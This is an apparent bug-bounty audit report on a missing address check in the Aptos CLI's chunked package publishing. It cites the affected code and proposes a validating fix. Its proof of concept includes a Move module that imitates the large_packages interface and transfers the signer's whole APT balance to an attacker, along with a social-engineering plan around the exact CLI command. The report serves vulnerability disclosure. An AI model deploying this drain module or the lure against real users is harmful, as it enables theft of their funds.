# Audit Report

## Title
Missing Module Address Validation in Chunked Package Publishing Allows Arbitrary Code Execution

## Summary
The `large_packages_module_address` parameter in chunked package publishing is not validated against the expected deployment address for the chain. This allows attackers to trick users into calling malicious modules that execute arbitrary code with the user's signing authority, potentially leading to fund theft and unauthorized package publishing.

## Finding Description

The vulnerability exists in the chunked package publishing flow where the `large_packages_module_address` parameter is accepted without validation.

**Root Cause Location:** [1](#0-0) 

In the `large_packages_module_address()` method, if a user provides a custom address via the `--large-packages-module-address` CLI flag, it is returned directly without any validation: [2](#0-1) 

This unvalidated address is then used to construct transaction payloads: [3](#0-2) 

The address is used to create entry function calls to modules at the attacker-controlled address: [4](#0-3) 

**Attack Scenario:**

1. Attacker deploys a malicious Move module at their address (e.g., `0xattacker`) with entry functions matching the `large_packages` interface
2. Attacker's malicious `stage_code_chunk` function can steal funds, manipulate resources, or publish malicious code
3. Through social engineering (malicious tutorials, documentation, or support channels), attacker convinces user to run:
   ```
   aptos move publish --chunked-publish --large-packages-module-address 0xattacker
   ```
4. CLI generates transaction payloads calling the attacker's module instead of the legitimate one
5. User signs these transactions, granting the attacker's code execution with their signing authority

**Legitimate Module Reference:** [5](#0-4) 

The legitimate module handles sensitive operations like package publishing. An attacker's module could replace this with malicious logic.

**Invariant Violation:**

This breaks the **Access Control** invariant: users must only interact with authorized system modules. The vulnerability allows execution of untrusted code under the guise of legitimate framework functionality.

## Impact Explanation

**Severity: HIGH** (per Aptos bug bounty criteria - "Significant protocol violations")

The vulnerability enables:

1. **Arbitrary Code Execution**: Attacker gains full execution capabilities with user's signing authority
2. **Fund Theft**: Malicious module can transfer APT or other assets from victim's account
3. **Unauthorized Package Publishing**: Attacker can publish malicious bytecode under victim's account
4. **Resource Manipulation**: Can create, modify, or delete resources owned by the victim
5. **Privilege Escalation**: If victim has special permissions (e.g., governance rights), attacker can abuse them

While this requires social engineering, the impact of successful exploitation is severe, affecting user assets and account integrity directly.

## Likelihood Explanation

**Likelihood: MEDIUM**

**Factors increasing likelihood:**
- Users may encounter malicious tutorials or "custom network setup guides" suggesting the flag
- The CLI accepts the parameter without warning about security implications
- Less experienced users may not understand the security implications
- Legitimate use case exists (custom networks), creating plausible deniability for attackers

**Factors reducing likelihood:**
- Requires explicit use of `--large-packages-module-address` flag
- Default behavior uses correct addresses
- Requires social engineering component

## Recommendation

Implement strict validation of the `large_packages_module_address` parameter:

**Solution 1: Validate Against Expected Addresses**

In `crates/aptos/src/common/types.rs`, modify the `large_packages_module_address()` method:

```rust
pub(crate) async fn large_packages_module_address(
    &self,
    txn_options: &TransactionOptions,
) -> Result<AccountAddress, CliError> {
    let chain_id = match &txn_options.session {
        None => {
            let client = txn_options.rest_client()?;
            ChainId::new(client.get_ledger_information().await?.inner().chain_id)
        },
        Some(session_path) => {
            let sess = Session::load(session_path)?;
            sess.state_store().get_chain_id()?
        },
    };
    
    let expected_address = AccountAddress::from_str_strict(
        default_large_packages_module_address(&chain_id)
    ).map_err(|err| CliError::UnableToParse("Default Large Package Module Address", err.to_string()))?;
    
    if let Some(provided_address) = self.large_packages_module_address {
        // Validate that provided address matches expected address for the chain
        if provided_address != expected_address {
            return Err(CliError::CommandArgumentError(format!(
                "Invalid large_packages_module_address: expected {} for chain {}, but got {}. \
                Using a custom address can lead to security vulnerabilities.",
                expected_address, chain_id.id(), provided_address
            )));
        }
        return Ok(provided_address);
    }
    
    Ok(expected_address)
}
```

**Solution 2: Add Explicit Confirmation**

If custom addresses must be supported, add a confirmation prompt with clear security warnings when a non-default address is provided.

## Proof of Concept

**Malicious Module (attacker deploys this):**

```move
module attacker::fake_large_packages {
    use std::signer;
    use aptos_framework::coin;
    use aptos_framework::aptos_coin::AptosCoin;
    
    // Mimics legitimate interface but steals funds
    public entry fun stage_code_chunk(
        owner: &signer,
        _metadata_chunk: vector<u8>,
        _code_indices: vector<u16>,
        _code_chunks: vector<vector<u8>>
    ) {
        // Steal all APT from victim
        let victim_addr = signer::address_of(owner);
        let balance = coin::balance<AptosCoin>(victim_addr);
        if (balance > 0) {
            coin::transfer<AptosCoin>(owner, @attacker, balance);
        }
    }
    
    public entry fun stage_code_chunk_and_publish_to_account(
        owner: &signer,
        _metadata_chunk: vector<u8>,
        _code_indices: vector<u16>,
        _code_chunks: vector<vector<u8>>
    ) {
        // Steal funds on final transaction too
        let victim_addr = signer::address_of(owner);
        let balance = coin::balance<AptosCoin>(victim_addr);
        if (balance > 0) {
            coin::transfer<AptosCoin>(owner, @attacker, balance);
        }
        // Could also publish malicious code under victim's account here
    }
    
    public entry fun cleanup_staging_area(_owner: &signer) {
        // No-op or additional malicious actions
    }
}
```

**Exploitation Steps:**

1. Attacker publishes `fake_large_packages` module at address `0xattacker`
2. Attacker creates malicious tutorial/guide instructing users to publish with:
   ```bash
   aptos move publish --chunked-publish --large-packages-module-address 0xattacker
   ```
3. Victim follows instructions and runs the command
4. CLI generates transactions calling `0xattacker::fake_large_packages::stage_code_chunk` instead of legitimate module
5. Victim signs transactions, and their APT balance is transferred to attacker
6. Victim's intended package is never published; instead, attacker gains full control

**Verification:**

The lack of validation can be confirmed by tracing through the code path from CLI argument parsing to transaction payload construction, where no comparison is made between the provided address and the expected address for the active chain.

### Citations

**File:** crates/aptos/src/common/types.rs (L2684-2706)
```rust
    pub(crate) async fn large_packages_module_address(
        &self,
        txn_options: &TransactionOptions,
    ) -> Result<AccountAddress, CliError> {
        if let Some(address) = self.large_packages_module_address {
            return Ok(address);
        }

        let chain_id = match &txn_options.session {
            None => {
                let client = txn_options.rest_client()?;
                ChainId::new(client.get_ledger_information().await?.inner().chain_id)
            },
            Some(session_path) => {
                let sess = Session::load(session_path)?;
                sess.state_store().get_chain_id()?
            },
        };

        AccountAddress::from_str_strict(default_large_packages_module_address(&chain_id)).map_err(
            |err| CliError::UnableToParse("Default Large Package Module Address", err.to_string()),
        )
    }
```

**File:** aptos-move/framework/src/chunked_publish.rs (L36-43)
```rust
pub fn chunk_package_and_create_payloads(
    metadata: Vec<u8>,
    package_code: Vec<Vec<u8>>,
    publish_type: PublishType,
    object_address: Option<AccountAddress>,
    large_packages_module_address: AccountAddress,
    chunk_size: usize,
) -> Vec<TransactionPayload> {
```

**File:** aptos-move/framework/src/chunked_publish.rs (L126-138)
```rust
    TransactionPayload::EntryFunction(EntryFunction::new(
        ModuleId::new(
            large_packages_module_address,
            ident_str!("large_packages").to_owned(),
        ),
        ident_str!("stage_code_chunk").to_owned(),
        vec![],
        vec![
            bcs::to_bytes(&metadata_chunk).unwrap(),
            bcs::to_bytes(&code_indices).unwrap(),
            bcs::to_bytes(&code_chunks).unwrap(),
        ],
    ))
```

**File:** aptos-move/framework/aptos-experimental/sources/large_packages.move (L66-78)
```text
    public entry fun stage_code_chunk(
        owner: &signer,
        metadata_chunk: vector<u8>,
        code_indices: vector<u16>,
        code_chunks: vector<vector<u8>>
    ) acquires StagingArea {
        stage_code_chunk_internal(
            owner,
            metadata_chunk,
            code_indices,
            code_chunks
        );
    }
```
